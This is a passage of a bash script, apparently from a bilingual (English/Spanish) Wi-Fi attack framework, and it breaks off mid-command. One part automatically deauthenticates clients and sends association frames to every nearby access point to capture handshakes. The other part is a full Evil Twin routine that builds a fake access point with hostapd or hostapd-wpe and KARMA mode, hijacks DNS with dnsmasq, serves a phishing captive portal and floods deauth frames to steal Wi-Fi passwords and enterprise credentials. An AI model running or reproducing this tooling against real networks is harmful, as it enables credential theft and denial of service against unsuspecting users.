\"${not_pwned_aps_list[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${pwned_bssid}\" | tr '\\n' ' '))\n        not_pwneable_aps_list=($(echo \"${not_pwneable_aps_list[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${pwned_bssid}\" | tr '\\n' ' '))\n      fi\n    done\n\n    # Remove duplicates\n    seen_aps=($(echo \"${seen_aps[@]}\" | tr ' ' '\\n' | sort -u | tr '\\n' ' '))\n    pwned_aps_list=($(echo \"${pwned_aps_list[@]}\" | tr ' ' '\\n' | sort -u | tr '\\n' ' '))\n    not_pwned_aps_list=($(echo \"${not_pwned_aps_list[@]}\" | tr ' ' '\\n' | sort -u | tr '\\n' ' '))\n    not_pwneable_aps_list=($(echo \"${not_pwneable_aps_list[@]}\" | tr ' ' '\\n' | sort -u | tr '\\n' ' '))\n\n    activity=\"false\"\n\n    if [ \"$debug\" == \"true\" ]; then\n      echo -e \"seen_aps: ${seen_aps[@]}\"\n      echo -e \"pwned_aps_list: ${pwned_aps_list[@]}\"\n      echo -e \"not_pwned_aps_list: ${not_pwned_aps_list[@]}\"\n      echo -e \"not_pwneable_aps_list: ${not_pwneable_aps_list[@]}\\n\"\n    fi\n\n    # Iterate over all APs discovered\n    while IFS= read -r line; do\n      already_pwned=\"false\"\n      not_pwned=\"false\"\n      not_pwneable=\"false\"\n      removed_from_seen_aps=\"false\"\n\n      if [ \"$exit_from_tool\" == \"false\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln  \"*\" \"Returning to main menu...\"\n        else\n          color_output_ln \"*\" \"Volviendo al menú principal...\"\n        fi\n        sleep 1\n\n        break\n      elif [ \"$exit_from_tool\" == \"true\" ]; then\n        break\n      fi\n\n      # Parse information\n      bssid=\"$(echo ${line} | awk '{print $1}' FS=',' | sed 's/^[\" \"]*//')\"\n      essid=\"$(echo ${line} | grep -oP \"(?<=$bssid,).*(?=,\\d+,)\")\"\n      channel=\"$(echo ${line} | grep -oP \"(?<=$bssid,$essid,)(\\d+)(?=,)\")\"\n      stations_info=\"$(echo -e \"${aps}\" | grep -i \"${bssid}\" | awk '{print $2}' FS=\"${bssid},${essid},${channel},\" | tr -d \"\\n\")\"\n      IFS=',' read -r -a stations <<< \"$stations_info\"\n\n      #echo -e \"bssid: $bssid\"\n      #echo -e \"essid: $essid\"\n      #echo -e \"channel: $channel\"\n      #echo -e \"stations_info: $stations_info\"\n      #echo -e \"stations: ${stations[@]}\"\n\n      if [ \"${whitelist_bssid}\" == \"$(echo \"${bssid}\" | tr '[:upper:]' '[:lower:]')\" ]; then\n        if [ \"$debug\" == \"true\" ]; then\n          echo -e \"Skipping whitelist bssid\"\n        fi\n        continue\n      fi\n\n      # Check if current AP was already pwned to skip it\n      for pwned_ap in \"${pwned_aps_list[@]}\"; do\n        if [ \"${pwned_ap}\" == \"${bssid}\" ]; then\n          already_pwned=\"true\"\n          break\n        fi\n      done\n\n      # Skip until next AP\n      if [ \"$already_pwned\" == \"true\" ]; then\n        if [ \"$debug\" == \"true\" ]; then\n          echo -e \"Skipping ${bssid} ($essid) as it is already pwned\"\n        fi\n        continue\n      fi\n\n      pwnagotchi_check_handshake \"${bssid}\" \"${essid}\" &\n\n      # Check if AP is included in not_pwned_aps_list array\n      for not_pwned_ap in \"${not_pwned_aps_list[@]}\"; do\n        if [ \"${not_pwned_ap}\" == \"${bssid}\" ]; then\n          #echo \"Removing $bssid ($essid) from not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\\n' | sort -u | tr '\\n' ' ')\"\n          not_pwned_aps_list=($(echo \"${not_pwned_aps_list[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${bssid}\" | tr '\\n' ' '))\n          #echo \"Adding $bssid ($essid) to not_pwneable_aps_list: $(echo ${not_pwneable_aps_list[@]} | tr ' ' '\\n' | sort -u | tr '\\n' ' ')\"\n          not_pwneable_aps_list+=(\"${bssid}\")\n          not_pwned=\"true\"\n          break\n        fi\n      done\n\n      # Parse stations associated to each AP and check if new stations were added\n      current_stations=\"${stations_info}\"\n      old_stations=\"$(echo \"${old_aps}\" | grep -i \"${bssid}\" | awk '{print $2}' FS=\"${bssid},${essid},${channel},\" | tr -d \"\\n\")\"\n\n      if [ \"$debug\" == \"true\" ]; then\n        echo \"current_stations: ${current_stations[@]}\"\n        echo \"old_stations: ${old_stations[@]}\"\n      fi\n\n      #echo -e \"current_stations: ${current_stations[@]}\"\n      #echo -e \"old_stations: ${old_stations[@]}\"\n\n      # Check if current AP is marked as a AP which cannot be pwned due to multiple unsuccessful attempts\n      for not_pwneable_ap in ${not_pwneable_aps_list[@]}; do\n        if [ \"${not_pwneable_ap}\" == \"${bssid}\" ] && [ \"${current_stations}\" == \"${old_stations}\" ]; then\n          not_pwneable=\"true\"\n          break\n        fi\n      done\n\n      # Skip until next AP as current AP is not pwneable\n      if [ \"${not_pwneable}\" == \"true\" ]; then\n        #echo -e \"Skipping not pwneable AP: ${bssid}\"\n        seen_aps=($(echo \"${seen_aps[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${bssid}\" | tr '\\n' ' '))\n        not_pwned_aps_list=($(echo \"${not_pwned_aps_list[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${bssid}\" | tr '\\n' ' '))\n        continue\n      fi\n\n      # Iterate over seen_aps array to add current AP to not_pwned_aps in case its handshake was not captured\n      for seen_ap in \"${seen_aps[@]}\"; do\n        if [ \"${seen_ap}\" == \"${bssid}\" ]; then\n          #echo \"Adding $bssid ($essid) to not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\\n' | sort -u | tr '\\n' ' ')\"\n          not_pwned_aps_list+=(\"${bssid}\") # Add AP to not_pwned_aps_list array\n          #echo \"Removing $bssid ($essid) from seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\\n' | sort -u | tr '\\n' ' ')\"\n          seen_aps=($(echo \"${seen_aps[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${bssid}\" | tr '\\n' ' '))\n          removed_from_seen_aps=\"true\"\n          break\n        fi\n      done\n\n      # If current AP is not present in not_pwned_aps_list array, then add it to seen_aps array as it is a new discovered AP\n      if [ \"${removed_from_seen_aps}\" == \"false\" ] && [ \"${not_pwned}\" == \"false\" ] && [ \"${not_pwneable}\" == \"false\" ]; then\n        #echo \"Adding $bssid (${essid}) to seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\\n' | sort -u | tr '\\n' ' ')\"\n        # Add bssid to seen_aps arraya\n        seen_aps+=(\"${bssid}\")\n        #echo -e \"$bssid (${essid}) added to seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\\n' | sort -u | tr '\\n' ' ')\"\n      fi\n\n      # Change current channel to interact with target if necessary\n      if [ \"${current_channel}\" != \"${channel}\" ] || [ \"$first_loop\" == \"true\" ]; then\n        execute_bettercap_command \"wifi.recon.channel ${channel}\"\n        current_channel=\"${channel}\"\n        first_loop=\"false\"\n        sleep 0.1\n      fi\n\n      # Send association to AP to try to catch PMKID handshake\n      execute_bettercap_command \"wifi.assoc ${bssid}\"\n      activity=\"true\"\n\n      if [ \"$essid\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Sending association frame to ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}\"\n        else\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Enviando paquete de asociación a ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}\"\n        fi\n      else\n        if [ \"$lang\" == \"en\" ]; then\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Sending association frame to ${grayC}${bssid}${endC}\"\n        else\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Enviando paquete de asociación a ${grayC}${bssid}${endC}\"\n        fi\n      fi\n\n      sleep 0.2\n\n      # Deauthenticate stations of current AP\n      for sta in ${stations}; do\n        if [ \"$essid\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Deauthing station ${grayC}${sta} ${blueC}from ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}\"\n          else\n            echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Deautenticando la estación ${grayC}${sta} ${blueC}de ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}\"\n          fi\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Deauthing station ${grayC}${sta} ${blueC}from ${grayC}${bssid}${endC}\"\n          else\n            echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Deautenticando la estación ${grayC}${sta} ${blueC}de ${grayC}${bssid}${endC}\"\n          fi\n        fi\n        execute_bettercap_command \"wifi.deauth ${sta}\"\n\n        activity=\"true\"\n        sleep 0.2\n      done\n\n      sleep 0.1\n      #pwnagotchi_check_handshake \"${bssid}\" \"${essid}\" &\n\n    done < <(printf '%s\\n' \"${aps}\")\n\n    if [ \"${activity}\" == \"false\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] There is not recent activity (no new APs were discovered)${endC}\"\n      else\n        echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] No hay actividad reciente (no se encontraron nuevos APs)${endC}\"\n      fi\n    fi\n\n    if [ \"$exit_from_tool\" == \"true\" ]; then\n      killall bettercap &>/dev/null\n      rm /root/bettercap-wifi-handshakes.pcap /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null\n      ctrl_c\n    elif [ \"$exit_from_tool\" == \"false\" ]; then\n      killall bettercap &>/dev/null\n      rm /root/bettercap-wifi-handshakes.pcap /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null\n      exit_from_tool=\"\"\n      break\n    fi\n\n    old_aps=\"${aps}\"\n\n  done\n}\n\n# Evil Twin: 1º Hostapd --> 2º Dnsmasq --> 3º Lighttpd --> 4º Deauth (optional)\nfunction evil_twin(){\n  clear\n  color_output_ln \"*\" \"This attack creates a fake access point to obtain the password of a legitimate access point or login credentials by using custom templates\"\n  scan_aps\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\t\n  if [ \"${channel}\" -lt \"15\" ]; then \n    hw_mode=g # 2.4 GHz\n  else\n    hw_mode=a # 5 GHz\n  fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"${blueC}\\nAvailable types of attack:${endC}\"\n  else\n    echo -e \"${blueC}\\nTipos de ataques disponibles:${endC}\"\n  fi\n  evil_twin_panel\n\n  while true; do\n    echo\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_no_line \"*\" \"Select an option: \" && read evil_option\n    else\n      color_output_no_line \"*\" \"Selecciona una opción: \" && read evil_option\n    fi\n\n    if [ \"$evil_option\" != \"1\" ] && [ \"$evil_option\" != \"2\" ] && [ \"$evil_option\" != \"3\" ] && [ \"$evil_option\" != \"4\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        color_output \"X\" \"Invalid option\"\n      else\n        color_output \"X\" \"Opción inválida\"\n      fi\n    else\n      break\n    fi\n  done\n\n  if [ \"$evil_option\" == \"back\" ]; then\n    return\n  fi\n\n  echo\n  if [ \"$evil_option\" == \"1\" ] || [ \"$evil_option\" == \"2\" ]; then\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_no_line \"*\" \"Do you want to use built-in templates (${yC}1${blueC}) or custom ones (${yC}2${blueC})? (default=1): \" && read template_type\n    else\n      color_output_no_line \"*\" \"¿Quieres usar plantillas predefinidas (${yC}1${blueC}) o plantillas personalizadas (${yC}2${blueC})? (por defecto=1): \" && read template_type\n    fi\n\n    if [ \"$template_type\" == \"1\" ] || [ \"$template_type\" == \"default\" ] || [ ! \"$template_type\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to verify if submitted passwords are correct? (target's handshake needed) (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): \" && read check_passwords\n      else\n        color_output_no_line \"*\" \"¿Quieres verificar si las contraseñas introducidas son correctas? (se necesita el handshake del AP) (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): \" && read check_passwords\n      fi\n\n      if [ \"$check_passwords\" == \"y\" ] || [ \"$check_passwords\" == \"yes\" ] || [ \"$check_passwords\" == \"s\" ] || [ \"$check_passwords\" == \"si\" ] || [ ! \"$check_passwords\" ]; then\n        while true; do\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_no_line \"*\" \"Introduce path to handshake file: \" && read handshake_cap\n          else\n            color_output_no_line \"*\" \"Introduce la ruta del archivo de handshake: \" && read handshake_cap\n          fi\n\n          cap_name=\"${handshake_cap}\"\n          if [ \"${handshake_cap}\" == \"back\" ]; then\n            return\n          elif [ -f \"${handshake_cap}\" ]; then\n\n            if [ ! \"$(file \"${handshake_cap}\" | grep \"cap capture file\")\" ]; then\n              if [ \"$lang\" == \"en\" ]; then\n                color_output \"X\" \"Given file is not a valid network capture\"\n              else\n                color_output \"X\" \"El archivo no es una captura de red válida\"\n              fi\n\n              continue\n            fi\n\n            if [ \"$(check_handshakes_in_file \"${cap_name}\")\" -gt \"0\" ]; then\n              break\n            else\n              if [ \"$lang\" == \"en\" ]; then\n                color_output \"X\" \"File does not contain any handshake\"\n              else\n                color_output \"X\" \"El archivo no contiene ningún handshake\"\n              fi\n            fi\n          else\n            if [ \"$lang\" == \"en\" ]; then\n              color_output \"X\" \"File does not exist\"\n            else\n              color_output \"X\" \"El archivo no existe\"\n            fi\n          fi\n        done\n      elif [ \"$check_passwords\" == \"back\" ]; then\n        return\n      fi\n    elif [ \"$template_type\" == \"2\" ] || [ \"$template_type\" == \"custom\" ]; then\n      while true; do\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_no_line \"*\" \"Introduce path to template root: \" && read portal_path\n        else\n          color_output_no_line \"*\" \"Introduce la ruta de la raíz de la plantilla: \" && read portal_path\n        fi\n\n        if [ ! -d \"${portal_path}\" ]; then\n          if [ \"$lang\" == \"en\" ]; then\n            color_output \"X\" \"Given path cannot be found\"\n          else\n            color_output \"X\" \"No se encuentra la ruta especificada\"\n          fi\n        else\n          break\n        fi\n      done\n    fi\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_no_line \"*\" \"Do you want to spoof ${essid} BSSID? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): \" && read mac_spoof\n    else\n      color_output_no_line \"*\" \"¿Quieres suplantar la BSSID de ${essid}? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): \" && read mac_spoof\n    fi\n\n    if [ ! \"$mac_spoof\" ]; then\n      mac_spoof=\"no\"\n    fi\n\n    if [ \"$(command -v hostapd-wpe)\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        color_output_no_line \"*\" \"Do you want to enable KARMA mode? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): \" && read karma\n      else\n        color_output_no_line \"*\" \"¿Quieres activar el modo KARMA? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): \" && read karma\n      fi\n\n      if [ ! \"$karma\" ]; then\n        karma=\"no\"\n      fi\n    fi\n  fi\n\n  check_and_create \"/tmp/www\"\n  if [ \"$evil_option\" == \"2\" ] || [ \"$evil_option\" == \"4\" ]; then\n\n    if [ \"$lang\" == \"en\" ]; then\n      if [ \"$(check_vif)\" ]; then\n        good_output \"+\" \"Your network adapter seems to support VIF\"\n      else\n        color_output \"*\" \"Your network adapter does not seem to support VIF\"\n      fi\n      color_output_no_line \"*\" \"To perform the DoS attack while the AP is running, physical card must be split into 2 cards (Virtual Interface). Do you want to continue? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read vif_check\n    else\n      if [ \"$(check_vif)\" ]; then\n        good_output \"+\" \"Tu adaptador de red parece soportar VIF\"\n      else\n        color_output \"*\" \"Tu adaptador de red parece no soportar VIF\"\n      fi\n      color_output_no_line \"*\" \"Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). ¿Quieres continuar? (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read vif_check\n    fi\n\n    if [ \"$vif_check\" == \"n\" ] || [ \"$vif_check\" == \"no\" ] || [ \"$vif_check\" == \"back\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${blueC}Going back to menu...${endC}\"; sleep 0.3\n      else\n        echo -e \"${blueC}Volviendo al menu...${endC}\"; sleep 0.3\n      fi\n      return\n    fi\n  fi\n\n  trap keep_exit_eviltwin INT\n  if [ \"$lang\" == \"en\" ]; then\n    color_output_ln \"*\" \"Configuring interface...\"\n  else\n    color_output_ln \"*\" \"Configurando la interfaz...\"\n  fi\n\n  # Strange workaround for some interface errors & monitor mode\n  airmon-ng stop ${netCard} &>/dev/null; sleep 0.1\n  setup_interface_eviltwin\n\n  if [ \"$lang\" == \"en\" ]; then\n    good_output \"+\" \"Interface configured successfully\"\n  else\n    good_output \"+\" \"Interfaz configurada correctamente\"\n  fi\n\n  systemctl stop systemd-resolved &>/dev/null\n  fuser -k 80/tcp &>/dev/null; sleep 0.1\n\n  if [ \"${airmon_check_kill}\" == \"true\" ]; then\n    airmon-ng check kill &>/dev/null\n  fi\n\n  killall hostapd hostapd-wpe dnsmasq lighttpd xterm dhcpd 2>/dev/null # Kill processes\n  rm /usr/share/wef/cache/*.conf 2>/dev/null\n\n  if [ \"$evil_option\" == \"1\" ] || [ \"$evil_option\" == \"2\" ]; then\n    if [ \"$template_type\" == \"built-in\" ] || [ \"$template_type\" == \"builtin\" ] || [ \"$template_type\" == \"predefinidas\" ] || [ \"$template_type\" == \"default\" ] || [ ! \"$template_type\" ]; then\n      while true; do\n        languages=$(ls /usr/share/wef/main/captive-portals | grep \"-\" | tr \"\\n\" \",\" | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)\n        if [ \"$lang\" == \"en\" ]; then\n          color_output_ln \"*\" \"${blueC}Available languages:${grayC} ${languages}${endC}\"\n          color_output_no_line \"*\" \"Select captive portal language you want to use, enter country code (i.e. en) (default=en): \" && read country_code\n        else\n          color_output_ln \"*\" \"${blueC}Idiomas disponibles:${grayC} ${languages}${endC}\"\n          color_output_no_line \"*\" \"Selecciona el idioma del portal cautivo a usar, introduce el código del país (e.g. es) (por defecto=en): \" && read country_code\n        fi\n\n        if [ ! \"$country_code\" ]; then\n          country_code=\"en\"\n        elif [ \"$country_code\" == \"back\" ]; then\n          return\n          evil_twin_c\n          killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null\n        fi\n\n        if [ \"$(echo \"${languages}\" | grep \"${country_code}\")\" ]; then\n          break\n        else\n          if [ \"$lang\" == \"en\" ]; then\n            color_output_ln \"X\" \"Invalid option\"; sleep 0.1\n          else\n            color_output_ln \"X\" \"Opción inválida\"; sleep 0.1\n          fi\n        fi\n      done\n    fi\n\n    # Set root of the web if a custom template was not provided\n    if [ ! \"${portal_path}\" ]; then\n      portal_path=\"/usr/share/wef/main/captive-portals/${country_code}-portal\"\n      create_template\n    fi\n\n    create_lighttpd_conf\n  fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    press_enter \"Some windows will open, do not close them. Press [Enter] to continue and launch attack \"\n  else\n    press_enter \"Algunas ventanas se abrirán, no las cierres. Presiona [Enter] para continuar y lanzar el ataque \"\n  fi\n\n  ip link set $evilCard up 2>/dev/null\n\n  sleep 3\n\n  # Creating hostapd configuration file\n  if [ \"$evil_option\" == \"1\" ] || [ \"$evil_option\" == \"2\" ]; then\n    echo \"interface=${evilCard}\nssid=${essid}\nhw_mode=${hw_mode}\nchannel=${channel}\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nieee80211n=1\nwme_enabled=1\ndriver=nl80211\" >> /usr/share/wef/cache/hostapd.conf\n\n  elif [ \"$evil_option\" == \"3\" ] || [ \"$evil_option\" == \"4\" ]; then\n    echo \"interface=${evilCard}\nssid=${essid}\nchannel=${channel}\n\neap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\nca_cert=/etc/hostapd-wpe/ca.pem\nserver_cert=/etc/hostapd-wpe/server.pem\nprivate_key=/etc/hostapd-wpe/server.key\nprivate_key_passwd=whatever\ndh_file=/etc/hostapd-wpe/dh\n\neap_server=1\neap_fast_a_id=101112131415161718191a1b1c1d1e1f\neap_fast_a_id_info=hostapd-wpe\neap_fast_prov=3\nieee8021x=1\npac_key_lifetime=604800\npac_key_refresh_time=86400\npac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\nwpa=2\nwpa_key_mgmt=WPA-EAP\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\n\nlogger_syslog=-1\nlogger_syslog_level=2\nlogger_stdout=-1\nlogger_stdout_level=2\n\nhw_mode=${hw_mode}\nmacaddr_acl=0\nauth_algs=3\nignore_broadcast_ssid=0\" >> /usr/share/wef/cache/hostapd.conf\n  fi\n\n  # Launch hostapd\n  if [ \"$evil_option\" == \"1\" ] || [ \"$evil_option\" == \"2\" ]; then\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      # No headless\n      if [ \"$karma\" == \"y\" ] || [ \"$karma\" == \"yes\" ] || [ \"$karma\" == \"s\" ] || [ \"$karma\" == \"si\" ]; then\n        xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -T \"Hostapd\" -xrm 'XTerm*selectToClipboard: true' -e \"hostapd-wpe /usr/share/wef/cache/hostapd.conf -k\" 2>/dev/null &\n      else\n        xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -T \"Hostapd\" -xrm 'XTerm*selectToClipboard: true' -e \"hostapd /usr/share/wef/cache/hostapd.conf\" 2>/dev/null &\n      fi\n    else\n      # Headless\n      if [ \"$karma\" == \"y\" ] || [ \"$karma\" == \"yes\" ] || [ \"$karma\" == \"s\" ] || [ \"$karma\" == \"si\" ]; then\n        hostapd-wpe /usr/share/wef/cache/hostapd.conf -k &>/dev/null &\n      else\n        hostapd /usr/share/wef/cache/hostapd.conf &>/dev/null &\n      fi\n    fi\n  elif [ \"$evil_option\" == \"3\" ] || [ \"$evil_option\" == \"4\" ]; then\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      # No headless\n      if [ \"$karma\" == \"y\" ] || [ \"$karma\" == \"yes\" ] || [ \"$karma\" == \"s\" ] || [ \"$karma\" == \"si\" ]; then\n        xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry 107x36-10+10 -T \"Hostapd-wpe\" -xrm 'XTerm*selectToClipboard: true' -e \"hostapd-wpe /usr/share/wef/cache/hostapd.conf -s -k\" 2>/dev/null &\n      else\n        xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry 107x36-10+10 -T \"Hostapd-wpe\" -xrm 'XTerm*selectToClipboard: true' -e \"hostapd-wpe /usr/share/wef/cache/hostapd.conf -s\" 2>/dev/null &\n      fi\n    else\n      # Headless\n      if [ \"$karma\" == \"y\" ] || [ \"$karma\" == \"yes\" ] || [ \"$karma\" == \"s\" ] || [ \"$karma\" == \"si\" ]; then\n        hostapd-wpe /usr/share/wef/cache/hostapd.conf -s -k &>/dev/null &\n      else\n        hostapd-wpe /usr/share/wef/cache/hostapd.conf -s &>/dev/null &\n      fi\n    fi\n  fi\n  hostapd_PID=$!\n\n  sleep 5\n\n  if [ \"$evil_option\" == \"1\" ] || [ \"$evil_option\" == \"2\" ]; then\n    # Creating dnsmasq configuration file\n    echo \"\n  interface=${evilCard}\n  dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h\n  dhcp-option=3,10.0.221.1\n  dhcp-option=6,10.0.221.1\n  server=8.8.8.8\n  log-queries\n  log-dhcp\n  listen-address=10.0.221.1\n  address=/#/10.0.221.1\" >> /usr/share/wef/cache/dnsmasq.conf\n\n    ip address add 10.0.221.1/24 dev ${evilCard}\n    #ifconfig ${evilCard} 10.0.221.1 netmask 255.255.255.0\n    route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1\n\n    # Dnsmasq\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -T \"Dnsmasq\" -xrm 'XTerm*selectToClipboard: true' -e \"dnsmasq -C /usr/share/wef/cache/dnsmasq.conf -d\" 2>/dev/null &\n    else\n      dnsmasq -C /usr/share/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &\n    fi\n    dnsmasq_PID=$!\n\n    sleep 5\n  fi\n\n  # Deauth\n  if [ \"$evil_option\" == \"2\" ] || [ \"$evil_option\" == \"4\" ]; then\n    iw dev mon${netCard} set channel ${channel} 2>/dev/null\n    sleep 0.1\n\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -T \"Deauth\" -xrm 'XTerm*selectToClipboard: true' -e \"aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} mon${evilCard}\" 2>/dev/null &\n    else\n      aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} \"mon${evilCard}\" > /dev/null 2>&1 &\n    fi\n    eviltwin_deauth_PID=$!\n\n    sleep 4\n  fi\n\n  if [ \"$evil_option\" == \"1\" ] || [ \"$evil_option\" == \"2\" ]; then\n    # Start web server (Lighttpd)\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -T \"Lighttpd\" -xrm 'XTerm*selectToClipboard: true' -e \"lighttpd -D -f /usr/share/wef/cache/lighttpd.conf\" 2>/dev/null &\n    else\n      lighttpd -f /usr/share/wef/cache/lighttpd.conf > /dev/null 2>&1 &\n    fi\n    lighttpd_PID=$!\n\n    sleep 4\n\n    export -f check_eviltwin_success # Export function\n    if [ \"${airmon_check_kill}\" == \"true\" ]; then\n      xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -T \"EvilTwin\" -xrm 'XTerm*selectToClipboard: true' -e \"check_eviltwin_success\" 2>/dev/null &\n      eviltwin_PID=$!\n    fi\n\n    if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n      ap_dir=\"${essid}-${ap_bssid}\"\n    elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n      ap_dir=\"${ap_bssid}\"\n    fi\n\n    mkdir \"/usr/share/wef/main/captures/${ap_dir}/\"\n\n    if [ \"$lang\" == \"en\" ]; then\n      if [ \"$check_passwords\" == \"y\" ] || [ \"$check_passwords\" == \"yes\" ] || [ \"$check_passwords\" == \"s\" ] || [ \"$check_passwords\" == \"si\" ]; then\n        good_output_ln \"+\" \"Evil Twin attack deployed successfully, when correct password is submitted attack will stop immediately\"\n      else\n        good_output_ln \"+\" \"Evil Twin attack deployed successfully\"\n      fi\n\n      if [ \"$template_type\" == \"built-in\" ] || [ \"$template_type\" == \"builtin\" ] || [ \"$template_type\" == \"predefinidas\" ] || [ \"$template_type\" == \"default\" ] || [ ! \"$template_type\" ]; then\n        check_eviltwin_password & # This will notify the user is the correct password is provided\n        color_output \"*\" \"Gathered passwords attempts will be stored in /usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt\"\n      else\n        color_output \"*\" \"As you are using a custom template, make sure to check the obtained data by your own\"\n      fi\n      \n      press_enter \"Press [Enter] to continue and finish the attack \"\n    else\n      if [ \"$check_passwords\" == \"y\" ] || [ \"$check_passwords\" == \"yes\" ] || [ \"$check_passwords\" == \"s\" ] || [ \"$check_passwords\" == \"si\" ]; then\n        good_output_ln \"+\" \"Ataque Evil Twin desplegado correctamente, cuando se introduzca la contraseña correcta se detendrá el ataque automaticamente\"\n      else\n        good_output_ln \"+\" \"Ataque Evil Twin desplegado correctamente\"\n      fi\n\n      if [ \"$template_type\" == \"built-in\" ] || [ \"$template_type\" == \"builtin\" ] || [ \"$template_type\" == \"predefinidas\" ] || [ \"$template_type\" == \"default\" ] || [ ! \"$template_type\" ]; then\n        check_eviltwin_password & # This will notify the user is the correct password is provided\n        color_output \"*\" \"Las contraseñas recolectadas serán almacenadas en /usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt\"\n      else\n        color_output \"*\" \"Al estar usando una plantilla personalizada, asegurate de comprobar la información obtenida por ti mismo\"\n      fi\n\n      press_enter \"Presiona [Enter] para continuar y terminar el ataque \"\n    fi\n\n    sleep 0.5\n    cp \"/tmp/www/attempts.txt\" \"/usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt\" 2>/dev/null\n\n  elif [ \"$evil_option\" == \"3\" ] || [ \"$evil_option\" == \"4\" ]; then\n\n    if [ \"$lang\" == \"en\" ]; then\n      color_output_ln \"*\" \"Obtained passwords or hashes will be shown on hostapd output\"\n      good_output \"+\" \"Evil Twin attack deployed successfully\"\n      press_enter \"Press [Enter] to continue and finish the attack \"\n    else\n      color_output_ln \"*\" \"Las contraseñas o hashes obtenidos se mostrarán en el output de hostapd\"\n      good_output \"+\" \"Ataque Evil Twin desplegado correctamente\"\n      press_enter \"Presiona [Enter] para continuar y terminar el ataque \"\n    fi\n\n    mv hostapd-wpe.log /usr/share/wef/cache/hostapd-wpe.log 2>/dev/null\n  fi\n  \n\n  # Attack finish here, restore interface and return to main menu\n  rm -rf \"/tmp/www\" 2>/dev/null\n  evil_twin_c\n  killall hostapd 